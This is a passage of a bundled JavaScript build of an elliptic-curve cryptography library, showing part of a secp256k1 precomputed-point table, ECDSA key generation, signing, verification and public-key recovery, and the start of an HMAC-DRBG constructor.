                    ["8c28a97bf8298bc0d23d8c749452a32e694b65e30a9472a3954ab30fe5324caa", "40a30463a3305193378fedf31f7cc0eb7ae784f0451cb9459e71dc73cbef9482"],
                    ["8ea9666139527a8c1dd94ce4f071fd23c8b350c5a4bb33748c4ba111faccae0", "620efabbc8ee2782e24e7c0cfb95c5d735b783be9cf0f8e955af34a30e62b945"],
                    ["dd3625faef5ba06074669716bbd3788d89bdde815959968092f76cc4eb9a9787", "7a188fa3520e30d461da2501045731ca941461982883395937f68d00c644a573"],
                    ["f710d79d9eb962297e4f6232b40e8f7feb2bc63814614d692c12de752408221e", "ea98e67232d3b3295d3b535532115ccac8612c721851617526ae47a9c77bfc82"],
                ],
            },
            naf: {
                wnd: 7,
                points: [
                    ["f9308a019258c31049344f85f89d5229b531c845836f99b08601f113bce036f9", "388f7b0f632de8140fe337e62a37f3566500a99934c2231b6cb9fd7584b8e672"],
                    ["2f8bde4d1a07209355b4a7250a5c5128e88b84bddc619ab7cba8d569b240efe4", "d8ac222636e5e3d6d4dba9dda6c9c426f788271bab0d6840dca87d3aa6ac62d6"],
                    ["5cbdf0646e5db4eaa398f365f2ea7a0e3d419b7e0330e39ce92bddedcac4f9bc", "6aebca40ba255960a3178d6d861a54dba813d0b813fde7b5a5082628087264da"],
                    ["acd484e2f0c7f65309ad178a9f559abde09796974c57e714c35f110dfc27ccbe", "cc338921b0a7d9fd64380971763b61e9add888a4375f8e0f05cc262ac64f9c37"],
                    ["774ae7f858a9411e5ef4246b70c65aac5649980be5c17891bbec17895da008cb", "d984a032eb6b5e190243dd56d7b7b365372db1e2dff9d6a8301d74c9c953c61b"],
                    ["f28773c2d975288bc7d1d205c3748651b075fbc6610e58cddeeddf8f19405aa8", "ab0902e8d880a89758212eb65cdaf473a1a06da521fa91f29b5cb52db03ed81"],
                    ["d7924d4f7d43ea965a465ae3095ff41131e5946f3c85f79e44adbcf8e27e080e", "581e2872a86c72a683842ec228cc6defea40af2bd896d3a5c504dc9ff6a26b58"],
                    ["defdea4cdb677750a420fee807eacf21eb9898ae79b9768766e4faa04a2d4a34", "4211ab0694635168e997b0ead2a93daeced1f4a04a95c0f6cfb199f69e56eb77"],
                    ["2b4ea0a797a443d293ef5cff444f4979f06acfebd7e86d277475656138385b6c", "85e89bc037945d93b343083b5a1c86131a01f60c50269763b570c854e5c09b7a"],
                    ["352bbf4a4cdd12564f93fa332ce333301d9ad40271f8107181340aef25be59d5", "321eb4075348f534d59c18259dda3e1f4a1b3b2e71b1039c67bd3d8bcf81998c"],
                    ["2fa2104d6b38d11b0230010559879124e42ab8dfeff5ff29dc9cdadd4ecacc3f", "2de1068295dd865b64569335bd5dd80181d70ecfc882648423ba76b532b7d67"],
                    ["9248279b09b4d68dab21a9b066edda83263c3d84e09572e269ca0cd7f5453714", "73016f7bf234aade5d1aa71bdea2b1ff3fc0de2a887912ffe54a32ce97cb3402"],
                    ["daed4f2be3a8bf278e70132fb0beb7522f570e144bf615c07e996d443dee8729", "a69dce4a7d6c98e8d4a1aca87ef8d7003f83c230f3afa726ab40e52290be1c55"],
                    ["c44d12c7065d812e8acf28d7cbb19f9011ecd9e9fdf281b0e6a3b5e87d22e7db", "2119a460ce326cdc76c45926c982fdac0e106e861edf61c5a039063f0e0e6482"],
                    ["6a245bf6dc698504c89a20cfded60853152b695336c28063b61c65cbd269e6b4", "e022cf42c2bd4a708b3f5126f16a24ad8b33ba48d0423b6efd5e6348100d8a82"],
                    ["1697ffa6fd9de627c077e3d2fe541084ce13300b0bec1146f95ae57f0d0bd6a5", "b9c398f186806f5d27561506e4557433a2cf15009e498ae7adee9d63d01b2396"],
                    ["605bdb019981718b986d0f07e834cb0d9deb8360ffb7f61df982345ef27a7479", "2972d2de4f8d20681a78d93ec96fe23c26bfae84fb14db43b01e1e9056b8c49"],
                    ["62d14dab4150bf497402fdc45a215e10dcb01c354959b10cfe31c7e9d87ff33d", "80fc06bd8cc5b01098088a1950eed0db01aa132967ab472235f5642483b25eaf"],
                    ["80c60ad0040f27dade5b4b06c408e56b2c50e9f56b9b8b425e555c2f86308b6f", "1c38303f1cc5c30f26e66bad7fe72f70a65eed4cbe7024eb1aa01f56430bd57a"],
                    ["7a9375ad6167ad54aa74c6348cc54d344cc5dc9487d847049d5eabb0fa03c8fb", "d0e3fa9eca8726909559e0d79269046bdc59ea10c70ce2b02d499ec224dc7f7"],
                    ["d528ecd9b696b54c907a9ed045447a79bb408ec39b68df504bb51f459bc3ffc9", "eecf41253136e5f99966f21881fd656ebc4345405c520dbc063465b521409933"],
                    ["49370a4b5f43412ea25f514e8ecdad05266115e4a7ecb1387231808f8b45963", "758f3f41afd6ed428b3081b0512fd62a54c3f3afbb5b6764b653052a12949c9a"],
                    ["77f230936ee88cbbd73df930d64702ef881d811e0e1498e2f1c13eb1fc345d74", "958ef42a7886b6400a08266e9ba1b37896c95330d97077cbbe8eb3c7671c60d6"],
                    ["f2dac991cc4ce4b9ea44887e5c7c0bce58c80074ab9d4dbaeb28531b7739f530", "e0dedc9b3b2f8dad4da1f32dec2531df9eb5fbeb0598e4fd1a117dba703a3c37"],
                    ["463b3d9f662621fb1b4be8fbbe2520125a216cdfc9dae3debcba4850c690d45b", "5ed430d78c296c3543114306dd8622d7c622e27c970a1de31cb377b01af7307e"],
                    ["f16f804244e46e2a09232d4aff3b59976b98fac14328a2d1a32496b49998f247", "cedabd9b82203f7e13d206fcdf4e33d92a6c53c26e5cce26d6579962c4e31df6"],
                    ["caf754272dc84563b0352b7a14311af55d245315ace27c65369e15f7151d41d1", "cb474660ef35f5f2a41b643fa5e460575f4fa9b7962232a5c32f908318a04476"],
                    ["2600ca4b282cb986f85d0f1709979d8b44a09c07cb86d7c124497bc86f082120", "4119b88753c15bd6a693b03fcddbb45d5ac6be74ab5f0ef44b0be9475a7e4b40"],
                    ["7635ca72d7e8432c338ec53cd12220bc01c48685e24f7dc8c602a7746998e435", "91b649609489d613d1d5e590f78e6d74ecfc061d57048bad9e76f302c5b9c61"],
                    ["754e3239f325570cdbbf4a87deee8a66b7f2b33479d468fbc1a50743bf56cc18", "673fb86e5bda30fb3cd0ed304ea49a023ee33d0197a695d0c5d98093c536683"],
                    ["e3e6bd1071a1e96aff57859c82d570f0330800661d1c952f9fe2694691d9b9e8", "59c9e0bba394e76f40c0aa58379a3cb6a5a2283993e90c4167002af4920e37f5"],
                    ["186b483d056a033826ae73d88f732985c4ccb1f32ba35f4b4cc47fdcf04aa6eb", "3b952d32c67cf77e2e17446e204180ab21fb8090895138b4a4a797f86e80888b"],
                    ["df9d70a6b9876ce544c98561f4be4f725442e6d2b737d9c91a8321724ce0963f", "55eb2dafd84d6ccd5f862b785dc39d4ab157222720ef9da217b8c45cf2ba2417"],
                    ["5edd5cc23c51e87a497ca815d5dce0f8ab52554f849ed8995de64c5f34ce7143", "efae9c8dbc14130661e8cec030c89ad0c13c66c0d17a2905cdc706ab7399a868"],
                    ["290798c2b6476830da12fe02287e9e777aa3fba1c355b17a722d362f84614fba", "e38da76dcd440621988d00bcf79af25d5b29c094db2a23146d003afd41943e7a"],
                    ["af3c423a95d9f5b3054754efa150ac39cd29552fe360257362dfdecef4053b45", "f98a3fd831eb2b749a93b0e6f35cfb40c8cd5aa667a15581bc2feded498fd9c6"],
                    ["766dbb24d134e745cccaa28c99bf274906bb66b26dcf98df8d2fed50d884249a", "744b1152eacbe5e38dcc887980da38b897584a65fa06cedd2c924f97cbac5996"],
                    ["59dbf46f8c94759ba21277c33784f41645f7b44f6c596a58ce92e666191abe3e", "c534ad44175fbc300f4ea6ce648309a042ce739a7919798cd85e216c4a307f6e"],
                    ["f13ada95103c4537305e691e74e9a4a8dd647e711a95e73cb62dc6018cfd87b8", "e13817b44ee14de663bf4bc808341f326949e21a6a75c2570778419bdaf5733d"],
                    ["7754b4fa0e8aced06d4167a2c59cca4cda1869c06ebadfb6488550015a88522c", "30e93e864e669d82224b967c3020b8fa8d1e4e350b6cbcc537a48b57841163a2"],
                    ["948dcadf5990e048aa3874d46abef9d701858f95de8041d2a6828c99e2262519", "e491a42537f6e597d5d28a3224b1bc25df9154efbd2ef1d2cbba2cae5347d57e"],
                    ["7962414450c76c1689c7b48f8202ec37fb224cf5ac0bfa1570328a8a3d7c77ab", "100b610ec4ffb4760d5c1fc133ef6f6b12507a051f04ac5760afa5b29db83437"],
                    ["3514087834964b54b15b160644d915485a16977225b8847bb0dd085137ec47ca", "ef0afbb2056205448e1652c48e8127fc6039e77c15c2378b7e7d15a0de293311"],
                    ["d3cc30ad6b483e4bc79ce2c9dd8bc54993e947eb8df787b442943d3f7b527eaf", "8b378a22d827278d89c5e9be8f9508ae3c2ad46290358630afb34db04eede0a4"],
                    ["1624d84780732860ce1c78fcbfefe08b2b29823db913f6493975ba0ff4847610", "68651cf9b6da903e0914448c6cd9d4ca896878f5282be4c8cc06e2a404078575"],
                    ["733ce80da955a8a26902c95633e62a985192474b5af207da6df7b4fd5fc61cd4", "f5435a2bd2badf7d485a4d8b8db9fcce3e1ef8e0201e4578c54673bc1dc5ea1d"],
                    ["15d9441254945064cf1a1c33bbd3b49f8966c5092171e699ef258dfab81c045c", "d56eb30b69463e7234f5137b73b84177434800bacebfc685fc37bbe9efe4070d"],
                    ["a1d0fcf2ec9de675b612136e5ce70d271c21417c9d2b8aaaac138599d0717940", "edd77f50bcb5a3cab2e90737309667f2641462a54070f3d519212d39c197a629"],
                    ["e22fbe15c0af8ccc5780c0735f84dbe9a790badee8245c06c7ca37331cb36980", "a855babad5cd60c88b430a69f53a1a7a38289154964799be43d06d77d31da06"],
                    ["311091dd9860e8e20ee13473c1155f5f69635e394704eaa74009452246cfa9b3", "66db656f87d1f04fffd1f04788c06830871ec5a64feee685bd80f0b1286d8374"],
                    ["34c1fd04d301be89b31c0442d3e6ac24883928b45a9340781867d4232ec2dbdf", "9414685e97b1b5954bd46f730174136d57f1ceeb487443dc5321857ba73abee"],
                    ["f219ea5d6b54701c1c14de5b557eb42a8d13f3abbcd08affcc2a5e6b049b8d63", "4cb95957e83d40b0f73af4544cccf6b1f4b08d3c07b27fb8d8c2962a400766d1"],
                    ["d7b8740f74a8fbaab1f683db8f45de26543a5490bca627087236912469a0b448", "fa77968128d9c92ee1010f337ad4717eff15db5ed3c049b3411e0315eaa4593b"],
                    ["32d31c222f8f6f0ef86f7c98d3a3335ead5bcd32abdd94289fe4d3091aa824bf", "5f3032f5892156e39ccd3d7915b9e1da2e6dac9e6f26e961118d14b8462e1661"],
                    ["7461f371914ab32671045a155d9831ea8793d77cd59592c4340f86cbc18347b5", "8ec0ba238b96bec0cbdddcae0aa442542eee1ff50c986ea6b39847b3cc092ff6"],
                    ["ee079adb1df1860074356a25aa38206a6d716b2c3e67453d287698bad7b2b2d6", "8dc2412aafe3be5c4c5f37e0ecc5f9f6a446989af04c4e25ebaac479ec1c8c1e"],
                    ["16ec93e447ec83f0467b18302ee620f7e65de331874c9dc72bfd8616ba9da6b5", "5e4631150e62fb40d0e8c2a7ca5804a39d58186a50e497139626778e25b0674d"],
                    ["eaa5f980c245f6f038978290afa70b6bd8855897f98b6aa485b96065d537bd99", "f65f5d3e292c2e0819a528391c994624d784869d7e6ea67fb18041024edc07dc"],
                    ["78c9407544ac132692ee1910a02439958ae04877151342ea96c4b6b35a49f51", "f3e0319169eb9b85d5404795539a5e68fa1fbd583c064d2462b675f194a3ddb4"],
                    ["494f4be219a1a77016dcd838431aea0001cdc8ae7a6fc688726578d9702857a5", "42242a969283a5f339ba7f075e36ba2af925ce30d767ed6e55f4b031880d562c"],
                    ["a598a8030da6d86c6bc7f2f5144ea549d28211ea58faa70ebf4c1e665c1fe9b5", "204b5d6f84822c307e4b4a7140737aec23fc63b65b35f86a10026dbd2d864e6b"],
                    ["c41916365abb2b5d09192f5f2dbeafec208f020f12570a184dbadc3e58595997", "4f14351d0087efa49d245b328984989d5caf9450f34bfc0ed16e96b58fa9913"],
                    ["841d6063a586fa475a724604da03bc5b92a2e0d2e0a36acfe4c73a5514742881", "73867f59c0659e81904f9a1c7543698e62562d6744c169ce7a36de01a8d6154"],
                    ["5e95bb399a6971d376026947f89bde2f282b33810928be4ded112ac4d70e20d5", "39f23f366809085beebfc71181313775a99c9aed7d8ba38b161384c746012865"],
                    ["36e4641a53948fd476c39f8a99fd974e5ec07564b5315d8bf99471bca0ef2f66", "d2424b1b1abe4eb8164227b085c9aa9456ea13493fd563e06fd51cf5694c78fc"],
                    ["336581ea7bfbbb290c191a2f507a41cf5643842170e914faeab27c2c579f726", "ead12168595fe1be99252129b6e56b3391f7ab1410cd1e0ef3dcdcabd2fda224"],
                    ["8ab89816dadfd6b6a1f2634fcf00ec8403781025ed6890c4849742706bd43ede", "6fdcef09f2f6d0a044e654aef624136f503d459c3e89845858a47a9129cdd24e"],
                    ["1e33f1a746c9c5778133344d9299fcaa20b0938e8acff2544bb40284b8c5fb94", "60660257dd11b3aa9c8ed618d24edff2306d320f1d03010e33a7d2057f3b3b6"],
                    ["85b7c1dcb3cec1b7ee7f30ded79dd20a0ed1f4cc18cbcfcfa410361fd8f08f31", "3d98a9cdd026dd43f39048f25a8847f4fcafad1895d7a633c6fed3c35e999511"],
                    ["29df9fbd8d9e46509275f4b125d6d45d7fbe9a3b878a7af872a2800661ac5f51", "b4c4fe99c775a606e2d8862179139ffda61dc861c019e55cd2876eb2a27d84b"],
                    ["a0b1cae06b0a847a3fea6e671aaf8adfdfe58ca2f768105c8082b2e449fce252", "ae434102edde0958ec4b19d917a6a28e6b72da1834aff0e650f049503a296cf2"],
                    ["4e8ceafb9b3e9a136dc7ff67e840295b499dfb3b2133e4ba113f2e4c0e121e5", "cf2174118c8b6d7a4b48f6d534ce5c79422c086a63460502b827ce62a326683c"],
                    ["d24a44e047e19b6f5afb81c7ca2f69080a5076689a010919f42725c2b789a33b", "6fb8d5591b466f8fc63db50f1c0f1c69013f996887b8244d2cdec417afea8fa3"],
                    ["ea01606a7a6c9cdd249fdfcfacb99584001edd28abbab77b5104e98e8e3b35d4", "322af4908c7312b0cfbfe369f7a7b3cdb7d4494bc2823700cfd652188a3ea98d"],
                    ["af8addbf2b661c8a6c6328655eb96651252007d8c5ea31be4ad196de8ce2131f", "6749e67c029b85f52a034eafd096836b2520818680e26ac8f3dfbcdb71749700"],
                    ["e3ae1974566ca06cc516d47e0fb165a674a3dabcfca15e722f0e3450f45889", "2aeabe7e4531510116217f07bf4d07300de97e4874f81f533420a72eeb0bd6a4"],
                    ["591ee355313d99721cf6993ffed1e3e301993ff3ed258802075ea8ced397e246", "b0ea558a113c30bea60fc4775460c7901ff0b053d25ca2bdeee98f1a4be5d196"],
                    ["11396d55fda54c49f19aa97318d8da61fa8584e47b084945077cf03255b52984", "998c74a8cd45ac01289d5833a7beb4744ff536b01b257be4c5767bea93ea57a4"],
                    ["3c5d2a1ba39c5a1790000738c9e0c40b8dcdfd5468754b6405540157e017aa7a", "b2284279995a34e2f9d4de7396fc18b80f9b8b9fdd270f6661f79ca4c81bd257"],
                    ["cc8704b8a60a0defa3a99a7299f2e9c3fbc395afb04ac078425ef8a1793cc030", "bdd46039feed17881d1e0862db347f8cf395b74fc4bcdc4e940b74e3ac1f1b13"],
                    ["c533e4f7ea8555aacd9777ac5cad29b97dd4defccc53ee7ea204119b2889b197", "6f0a256bc5efdf429a2fb6242f1a43a2d9b925bb4a4b3a26bb8e0f45eb596096"],
                    ["c14f8f2ccb27d6f109f6d08d03cc96a69ba8c34eec07bbcf566d48e33da6593", "c359d6923bb398f7fd4473e16fe1c28475b740dd098075e6c0e8649113dc3a38"],
                    ["a6cbc3046bc6a450bac24789fa17115a4c9739ed75f8f21ce441f72e0b90e6ef", "21ae7f4680e889bb130619e2c0f95a360ceb573c70603139862afd617fa9b9f"],
                    ["347d6d9a02c48927ebfb86c1359b1caf130a3c0267d11ce6344b39f99d43cc38", "60ea7f61a353524d1c987f6ecec92f086d565ab687870cb12689ff1e31c74448"],
                    ["da6545d2181db8d983f7dcb375ef5866d47c67b1bf31c8cf855ef7437b72656a", "49b96715ab6878a79e78f07ce5680c5d6673051b4935bd897fea824b77dc208a"],
                    ["c40747cc9d012cb1a13b8148309c6de7ec25d6945d657146b9d5994b8feb1111", "5ca560753be2a12fc6de6caf2cb489565db936156b9514e1bb5e83037e0fa2d4"],
                    ["4e42c8ec82c99798ccf3a610be870e78338c7f713348bd34c8203ef4037f3502", "7571d74ee5e0fb92a7a8b33a07783341a5492144cc54bcc40a94473693606437"],
                    ["3775ab7089bc6af823aba2e1af70b236d251cadb0c86743287522a1b3b0dedea", "be52d107bcfa09d8bcb9736a828cfa7fac8db17bf7a76a2c42ad961409018cf7"],
                    ["cee31cbf7e34ec379d94fb814d3d775ad954595d1314ba8846959e3e82f74e26", "8fd64a14c06b589c26b947ae2bcf6bfa0149ef0be14ed4d80f448a01c43b1c6d"],
                    ["b4f9eaea09b6917619f6ea6a4eb5464efddb58fd45b1ebefcdc1a01d08b47986", "39e5c9925b5a54b07433a4f18c61726f8bb131c012ca542eb24a8ac07200682a"],
                    ["d4263dfc3d2df923a0179a48966d30ce84e2515afc3dccc1b77907792ebcc60e", "62dfaf07a0f78feb30e30d6295853ce189e127760ad6cf7fae164e122a208d54"],
                    ["48457524820fa65a4f8d35eb6930857c0032acc0a4a2de422233eeda897612c4", "25a748ab367979d98733c38a1fa1c2e7dc6cc07db2d60a9ae7a76aaa49bd0f77"],
                    ["dfeeef1881101f2cb11644f3a2afdfc2045e19919152923f367a1767c11cceda", "ecfb7056cf1de042f9420bab396793c0c390bde74b4bbdff16a83ae09a9a7517"],
                    ["6d7ef6b17543f8373c573f44e1f389835d89bcbc6062ced36c82df83b8fae859", "cd450ec335438986dfefa10c57fea9bcc521a0959b2d80bbf74b190dca712d10"],
                    ["e75605d59102a5a2684500d3b991f2e3f3c88b93225547035af25af66e04541f", "f5c54754a8f71ee540b9b48728473e314f729ac5308b06938360990e2bfad125"],
                    ["eb98660f4c4dfaa06a2be453d5020bc99a0c2e60abe388457dd43fefb1ed620c", "6cb9a8876d9cb8520609af3add26cd20a0a7cd8a9411131ce85f44100099223e"],
                    ["13e87b027d8514d35939f2e6892b19922154596941888336dc3563e3b8dba942", "fef5a3c68059a6dec5d624114bf1e91aac2b9da568d6abeb2570d55646b8adf1"],
                    ["ee163026e9fd6fe017c38f06a5be6fc125424b371ce2708e7bf4491691e5764a", "1acb250f255dd61c43d94ccc670d0f58f49ae3fa15b96623e5430da0ad6c62b2"],
                    ["b268f5ef9ad51e4d78de3a750c2dc89b1e626d43505867999932e5db33af3d80", "5f310d4b3c99b9ebb19f77d41c1dee018cf0d34fd4191614003e945a1216e423"],
                    ["ff07f3118a9df035e9fad85eb6c7bfe42b02f01ca99ceea3bf7ffdba93c4750d", "438136d603e858a3a5c440c38eccbaddc1d2942114e2eddd4740d098ced1f0d8"],
                    ["8d8b9855c7c052a34146fd20ffb658bea4b9f69e0d825ebec16e8c3ce2b526a1", "cdb559eedc2d79f926baf44fb84ea4d44bcf50fee51d7ceb30e2e7f463036758"],
                    ["52db0b5384dfbf05bfa9d472d7ae26dfe4b851ceca91b1eba54263180da32b63", "c3b997d050ee5d423ebaf66a6db9f57b3180c902875679de924b69d84a7b375"],
                    ["e62f9490d3d51da6395efd24e80919cc7d0f29c3f3fa48c6fff543becbd43352", "6d89ad7ba4876b0b22c2ca280c682862f342c8591f1daf5170e07bfd9ccafa7d"],
                    ["7f30ea2476b399b4957509c88f77d0191afa2ff5cb7b14fd6d8e7d65aaab1193", "ca5ef7d4b231c94c3b15389a5f6311e9daff7bb67b103e9880ef4bff637acaec"],
                    ["5098ff1e1d9f14fb46a210fada6c903fef0fb7b4a1dd1d9ac60a0361800b7a00", "9731141d81fc8f8084d37c6e7542006b3ee1b40d60dfe5362a5b132fd17ddc0"],
                    ["32b78c7de9ee512a72895be6b9cbefa6e2f3c4ccce445c96b9f2c81e2778ad58", "ee1849f513df71e32efc3896ee28260c73bb80547ae2275ba497237794c8753c"],
                    ["e2cb74fddc8e9fbcd076eef2a7c72b0ce37d50f08269dfc074b581550547a4f7", "d3aa2ed71c9dd2247a62df062736eb0baddea9e36122d2be8641abcb005cc4a4"],
                    ["8438447566d4d7bedadc299496ab357426009a35f235cb141be0d99cd10ae3a8", "c4e1020916980a4da5d01ac5e6ad330734ef0d7906631c4f2390426b2edd791f"],
                    ["4162d488b89402039b584c6fc6c308870587d9c46f660b878ab65c82c711d67e", "67163e903236289f776f22c25fb8a3afc1732f2b84b4e95dbda47ae5a0852649"],
                    ["3fad3fa84caf0f34f0f89bfd2dcf54fc175d767aec3e50684f3ba4a4bf5f683d", "cd1bc7cb6cc407bb2f0ca647c718a730cf71872e7d0d2a53fa20efcdfe61826"],
                    ["674f2600a3007a00568c1a7ce05d0816c1fb84bf1370798f1c69532faeb1a86b", "299d21f9413f33b3edf43b257004580b70db57da0b182259e09eecc69e0d38a5"],
                    ["d32f4da54ade74abb81b815ad1fb3b263d82d6c692714bcff87d29bd5ee9f08f", "f9429e738b8e53b968e99016c059707782e14f4535359d582fc416910b3eea87"],
                    ["30e4e670435385556e593657135845d36fbb6931f72b08cb1ed954f1e3ce3ff6", "462f9bce619898638499350113bbc9b10a878d35da70740dc695a559eb88db7b"],
                    ["be2062003c51cc3004682904330e4dee7f3dcd10b01e580bf1971b04d4cad297", "62188bc49d61e5428573d48a74e1c655b1c61090905682a0d5558ed72dccb9bc"],
                    ["93144423ace3451ed29e0fb9ac2af211cb6e84a601df5993c419859fff5df04a", "7c10dfb164c3425f5c71a3f9d7992038f1065224f72bb9d1d902a6d13037b47c"],
                    ["b015f8044f5fcbdcf21ca26d6c34fb8197829205c7b7d2a7cb66418c157b112c", "ab8c1e086d04e813744a655b2df8d5f83b3cdc6faa3088c1d3aea1454e3a1d5f"],
                    ["d5e9e1da649d97d89e4868117a465a3a4f8a18de57a140d36b3f2af341a21b52", "4cb04437f391ed73111a13cc1d4dd0db1693465c2240480d8955e8592f27447a"],
                    ["d3ae41047dd7ca065dbf8ed77b992439983005cd72e16d6f996a5316d36966bb", "bd1aeb21ad22ebb22a10f0303417c6d964f8cdd7df0aca614b10dc14d125ac46"],
                    ["463e2763d885f958fc66cdd22800f0a487197d0a82e377b49f80af87c897b065", "bfefacdb0e5d0fd7df3a311a94de062b26b80c61fbc97508b79992671ef7ca7f"],
                    ["7985fdfd127c0567c6f53ec1bb63ec3158e597c40bfe747c83cddfc910641917", "603c12daf3d9862ef2b25fe1de289aed24ed291e0ec6708703a5bd567f32ed03"],
                    ["74a1ad6b5f76e39db2dd249410eac7f99e74c59cb83d2d0ed5ff1543da7703e9", "cc6157ef18c9c63cd6193d83631bbea0093e0968942e8c33d5737fd790e0db08"],
                    ["30682a50703375f602d416664ba19b7fc9bab42c72747463a71d0896b22f6da3", "553e04f6b018b4fa6c8f39e7f311d3176290d0e0f19ca73f17714d9977a22ff8"],
                    ["9e2158f0d7c0d5f26c3791efefa79597654e7a2b2464f52b1ee6c1347769ef57", "712fcdd1b9053f09003a3481fa7762e9ffd7c8ef35a38509e2fbf2629008373"],
                    ["176e26989a43c9cfeba4029c202538c28172e566e3c4fce7322857f3be327d66", "ed8cc9d04b29eb877d270b4878dc43c19aefd31f4eee09ee7b47834c1fa4b1c3"],
                    ["75d46efea3771e6e68abb89a13ad747ecf1892393dfc4f1b7004788c50374da8", "9852390a99507679fd0b86fd2b39a868d7efc22151346e1a3ca4726586a6bed8"],
                    ["809a20c67d64900ffb698c4c825f6d5f2310fb0451c869345b7319f645605721", "9e994980d9917e22b76b061927fa04143d096ccc54963e6a5ebfa5f3f8e286c1"],
                    ["1b38903a43f7f114ed4500b4eac7083fdefece1cf29c63528d563446f972c180", "4036edc931a60ae889353f77fd53de4a2708b26b6f5da72ad3394119daf408f9"],
                ],
            },
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var BN = __webpack_require__(15),
            HmacDRBG = __webpack_require__(264),
            utils = __webpack_require__(12),
            curves = __webpack_require__(60),
            rand = __webpack_require__(54),
            assert = utils.assert,
            KeyPair = __webpack_require__(265),
            Signature = __webpack_require__(266);
        function EC(options) {
            if (!(this instanceof EC)) return new EC(options);
            "string" == typeof options && (assert(Object.prototype.hasOwnProperty.call(curves, options), "Unknown curve " + options), (options = curves[options])),
                options instanceof curves.PresetCurve && (options = { curve: options }),
                (this.curve = options.curve.curve),
                (this.n = this.curve.n),
                (this.nh = this.n.ushrn(1)),
                (this.g = this.curve.g),
                (this.g = options.curve.g),
                this.g.precompute(options.curve.n.bitLength() + 1),
                (this.hash = options.hash || options.curve.hash);
        }
        (module.exports = EC),
            (EC.prototype.keyPair = function (options) {
                return new KeyPair(this, options);
            }),
            (EC.prototype.keyFromPrivate = function (priv, enc) {
                return KeyPair.fromPrivate(this, priv, enc);
            }),
            (EC.prototype.keyFromPublic = function (pub, enc) {
                return KeyPair.fromPublic(this, pub, enc);
            }),
            (EC.prototype.genKeyPair = function (options) {
                options || (options = {});
                for (
                    var drbg = new HmacDRBG({
                            hash: this.hash,
                            pers: options.pers,
                            persEnc: options.persEnc || "utf8",
                            entropy: options.entropy || rand(this.hash.hmacStrength),
                            entropyEnc: (options.entropy && options.entropyEnc) || "utf8",
                            nonce: this.n.toArray(),
                        }),
                        bytes = this.n.byteLength(),
                        ns2 = this.n.sub(new BN(2));
                    ;

                ) {
                    var priv = new BN(drbg.generate(bytes));
                    if (!(priv.cmp(ns2) > 0)) return priv.iaddn(1), this.keyFromPrivate(priv);
                }
            }),
            (EC.prototype._truncateToN = function (msg, truncOnly) {
                var delta = 8 * msg.byteLength() - this.n.bitLength();
                return delta > 0 && (msg = msg.ushrn(delta)), !truncOnly && msg.cmp(this.n) >= 0 ? msg.sub(this.n) : msg;
            }),
            (EC.prototype.sign = function (msg, key, enc, options) {
                "object" == typeof enc && ((options = enc), (enc = null)), options || (options = {}), (key = this.keyFromPrivate(key, enc)), (msg = this._truncateToN(new BN(msg, 16)));
                for (
                    var bytes = this.n.byteLength(),
                        bkey = key.getPrivate().toArray("be", bytes),
                        nonce = msg.toArray("be", bytes),
                        drbg = new HmacDRBG({ hash: this.hash, entropy: bkey, nonce: nonce, pers: options.pers, persEnc: options.persEnc || "utf8" }),
                        ns1 = this.n.sub(new BN(1)),
                        iter = 0;
                    ;
                    iter++
                ) {
                    var k = options.k ? options.k(iter) : new BN(drbg.generate(this.n.byteLength()));
                    if (!((k = this._truncateToN(k, !0)).cmpn(1) <= 0 || k.cmp(ns1) >= 0)) {
                        var kp = this.g.mul(k);
                        if (!kp.isInfinity()) {
                            var kpX = kp.getX(),
                                r = kpX.umod(this.n);
                            if (0 !== r.cmpn(0)) {
                                var s = k.invm(this.n).mul(r.mul(key.getPrivate()).iadd(msg));
                                if (0 !== (s = s.umod(this.n)).cmpn(0)) {
                                    var recoveryParam = (kp.getY().isOdd() ? 1 : 0) | (0 !== kpX.cmp(r) ? 2 : 0);
                                    return options.canonical && s.cmp(this.nh) > 0 && ((s = this.n.sub(s)), (recoveryParam ^= 1)), new Signature({ r: r, s: s, recoveryParam: recoveryParam });
                                }
                            }
                        }
                    }
                }
            }),
            (EC.prototype.verify = function (msg, signature, key, enc) {
                (msg = this._truncateToN(new BN(msg, 16))), (key = this.keyFromPublic(key, enc));
                var r = (signature = new Signature(signature, "hex")).r,
                    s = signature.s;
                if (r.cmpn(1) < 0 || r.cmp(this.n) >= 0) return !1;
                if (s.cmpn(1) < 0 || s.cmp(this.n) >= 0) return !1;
                var p,
                    sinv = s.invm(this.n),
                    u1 = sinv.mul(msg).umod(this.n),
                    u2 = sinv.mul(r).umod(this.n);
                return this.curve._maxwellTrick ? !(p = this.g.jmulAdd(u1, key.getPublic(), u2)).isInfinity() && p.eqXToP(r) : !(p = this.g.mulAdd(u1, key.getPublic(), u2)).isInfinity() && 0 === p.getX().umod(this.n).cmp(r);
            }),
            (EC.prototype.recoverPubKey = function (msg, signature, j, enc) {
                assert((3 & j) === j, "The recovery param is more than two bits"), (signature = new Signature(signature, enc));
                var n = this.n,
                    e = new BN(msg),
                    r = signature.r,
                    s = signature.s,
                    isYOdd = 1 & j,
                    isSecondKey = j >> 1;
                if (r.cmp(this.curve.p.umod(this.curve.n)) >= 0 && isSecondKey) throw new Error("Unable to find sencond key candinate");
                r = isSecondKey ? this.curve.pointFromX(r.add(this.curve.n), isYOdd) : this.curve.pointFromX(r, isYOdd);
                var rInv = signature.r.invm(n),
                    s1 = n.sub(e).mul(rInv).umod(n),
                    s2 = s.mul(rInv).umod(n);
                return this.g.mulAdd(s1, r, s2);
            }),
            (EC.prototype.getKeyRecoveryParam = function (e, signature, Q, enc) {
                if (null !== (signature = new Signature(signature, enc)).recoveryParam) return signature.recoveryParam;
                for (var i = 0; i < 4; i++) {
                    var Qprime;
                    try {
                        Qprime = this.recoverPubKey(e, signature, i);
                    } catch (e) {
                        continue;
                    }
                    if (Qprime.eq(Q)) return i;
                }
                throw new Error("Unable to find valid recovery factor");
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var hash = __webpack_require__(61),
            utils = __webpack_require__(119),
            assert = __webpack_require__(11);
        function HmacDRBG(options) {
            if (!(this instanceof HmacDRBG)) return new HmacDRBG(options);
            (this.hash = options.hash),
                (this.predResist = !!options.predResist),
                (this.outLen = this.hash.outSize),
                (this.minEntropy = options.minEntropy || this.hash.hmacStrength),
                (this._reseed = null),
                (this.reseedInterval = null),
                (this.K = null),
                (this.V = null);
            var entropy = utils.toArray(options.entropy, options.entropyEnc || "hex"),
                nonce = utils.toArray(options.nonce, options.nonceEnc || "hex"),
                pers = utils.toArray(options.pers, options.persEnc || "hex");
